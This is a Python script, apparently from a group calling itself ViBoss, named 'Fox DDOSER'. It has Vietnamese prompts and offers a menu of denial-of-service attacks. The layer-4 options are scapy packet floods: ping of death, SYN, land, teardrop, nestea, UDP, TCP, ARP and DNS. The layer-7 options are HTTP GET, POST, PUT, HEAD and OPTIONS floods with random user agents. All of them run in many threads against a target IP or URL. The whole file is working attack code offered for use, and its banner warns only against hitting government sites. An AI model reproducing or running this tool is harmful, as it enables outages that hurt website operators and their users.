from scapy.all import *
import socket
import threading
import random
import pyuseragents
import requests
from rainbowtext import text as rain
import pyfiglet
import colorama

# Khởi tạo màu sắc
colorama.init()
rd = colorama.Fore.RED
cv = colorama.Fore.WHITE
bl = colorama.Fore.BLUE
gn = colorama.Fore.GREEN
yl = colorama.Fore.YELLOW
mag = colorama.Fore.MAGENTA
cy = colorama.Fore.CYAN
lgn = colorama.Fore.LIGHTGREEN_EX

def banner():
    figlet = pyfiglet.Figlet(font="script").renderText("Fox DDOSER")
    return figlet

def ping_of_death(ip_target):
    i = 0
    while True:
        send(IP(dst=ip_target, ttl=132, id=1111)/ICMP()/(b"Sdadad"*8192), verbose=0)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def syn_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target, id=1111, ttl=99)
        tcp = TCP(sport=RandShort(), dport=80, seq=12345, ack=1000, windows=1000, flags="S")
        data = b"MRadikal" * 8192
        send(ip / tcp / data, verbose=0)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def malformed_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target, ihl=2, version=3, ttl=52, id=112)
        icmp = ICMP()
        send(ip / icmp, verbose=0)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def land_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target, src=ip_target, id=78, ttl=92)
        tcp = TCP(sport=135, dport=135)
        send(ip / tcp, verbose=0)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def nestea_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target, id=42, flags="MF")
        data = b"ZZZZ" * 1024
        send(ip / UDP() / data, verbose=0)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def udp_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target)
        udp = fuzz(UDP())
        send(ip / udp, verbose=0)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def arp_attack(ip_target):
    ether = Ether(dst="FF:FF:FF:FF:FF:FF")
    arp = ARP(psrc=RandIP(), pdst=ip_target)
    srp(ether / arp)

def teardrop_attack(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target, flags=0, proto=17, frag=3)
        data = b"\x00" * 100
        ips = IP(dst=ip_target, flags="MF", proto=17, frag=18)
        send(ip / data, verbose=0)
        send(ips / data, verbose=0)
        print(f"Gửi : {i}\n", end="\r")
        i += 2

def dns_spoofing(ip_target):
    i = 0
    while True:
        ip = IP(dst=ip_target, ttl=12)
        udp = UDP(sport=RandShort(), dport=53)
        dns = DNS(qd=DNSQR(qname="secdev.org", qtype="A"))
        send(ip / udp / dns)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def tcp_attack(ip_target):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sent = 0
    port = 80
    while True:
        bytes = random._urandom(1769)
        sock.sendto(bytes, (ip_target, port))
        sent += 1
        port += 1
        print(f"Gửi {sent} gói tin đến {ip_target} trên cổng: {port}", end="\r")
        if port == 65534:
            port = 1

def GET_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent": useragent}
    i = 0
    while True:
        requests.get(url_target, headers=header)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def POST_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent": useragent}
    i = 0
    while True:
        requests.post(url_target, headers=header)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def HEAD_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent": useragent}
    i = 0
    while True:
        requests.head(url_target, headers=header)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def PUT_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent": useragent}
    i = 0
    while True:
        requests.put(url_target, headers=header)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

def OPTIONS_attack(url_target):
    useragent = pyuseragents.random()
    header = {"User-Agent": useragent}
    i = 0
    while True:
        requests.options(url_target, headers=header)
        print(f"Gửi : {i}\n", end="\r")
        i += 1

print(rain(banner()))
print(rain("""
|==============================|
|         Black Fox            |
|       ViBoss Team.           |
|  Author : ViBoss Studio.     |
|    DDOSER Layer 4 , Layer 7  |
|==============================|

ĐỪNG TẤN CÔNG TRANG WEB CHÍNH PHỦ (NHÀ NƯỚC).

HÃY CÂN NHẮC VÀ CẨN THẬN KHI SỬ DỤNG VÌ VIỆC BẠN SẮP LÀM CÓ THỂ LÀ ĐIỀU PHẠM PHÁP
"""))

layer = input(cy + "[-] Chọn lớp tấn công:\n[-] layer4: Tấn công lớp 4\n[-] layer7: Tấn công lớp 7\n\n ~ Chọn lớp để tiếp tục -> ")

if layer == "layer4":
    ip_target = input(rd + "Nhập IP mục tiêu - > ")
    socketx = int(input(yl + "Nhập số lượng luồng (ví dụ: 10) - > "))
    method = input(gn + "[^] ping_of_death\n[^] syn\n[^] malformed\n[^] land\n[^] arp\n[^] nestea\n[^] dns_spoofing\n[^] teardrop\n[^] udp\n[^] tcp\n\n[~] Nhập phương thức: ")
    if method == "ping_of_death":
        for i in range(socketx):
            threading.Thread(target=ping_of_death, args=(ip_target,)).start()
    elif method == "syn":
        for i in range(socketx):
            threading.Thread(target=syn_attack, args=(ip_target,)).start()
    elif method == "malformed":
        for i in range(socketx):
            threading.Thread(target=malformed_attack, args=(ip_target,)).start()
    elif method == "land":
        for i in range(socketx):
            threading.Thread(target=land_attack, args=(ip_target,)).start()
    elif method == "arp":
        print("Bắt đầu tấn công ARP ngay lập tức .... !")
        for i in range(socketx):
            threading.Thread(target=arp_attack, args=(ip_target,)).start()
    elif method == "nestea":
        for i in range(socketx):
            threading.Thread(target=nestea_attack, args=(ip_target,)).start()
    elif method == "dns_spoofing":
        for i in range(socketx):
            threading.Thread(target=dns_spoofing, args=(ip_target,)).start()
    elif method == "teardrop":
        for i in range(socketx):
            threading.Thread(target=teardrop_attack, args=(ip_target,)).start()
    elif method == "udp":
        for i in range(socketx):
            threading.Thread(target=udp_attack, args=(ip_target,)).start()
    elif method == "tcp":
        for i in range(socketx):
            threading.Thread(target=tcp_attack, args=(ip_target,)).start()
elif layer == "layer7":
    url_target = input(bl + "Nhập URL mục tiêu: ")
    worker = int(input(mag + "Nhập số lượng luồng: "))
    method = input(lgn + "[$] GET\n[$] POST\n[$] PUT\n[$] HEAD\n[$] OPTIONS\n\n[*] Nhập phương thức: ")
    if method == "GET":
        for x in range(worker):
            threading.Thread(target=GET_attack, args=(url_target,)).start()
    elif method == "POST":
        for x in range(worker):
            threading.Thread(target=POST_attack, args=(url_target,)).start()
    elif method == "PUT":
        for x in range(worker):
            threading.Thread(target=PUT_attack, args=(url_target,)).start()
    elif method == "HEAD":
        for x in range(worker):
            threading.Thread(target=HEAD_attack, args=(url_target,)).start()
    elif method == "OPTIONS":
        for x in range(worker):
            threading.Thread(target=OPTIONS_attack, args=(url_target,)).start()
else:
    print("Lớp tấn công không hợp lệ. Vui lòng chọn lại.")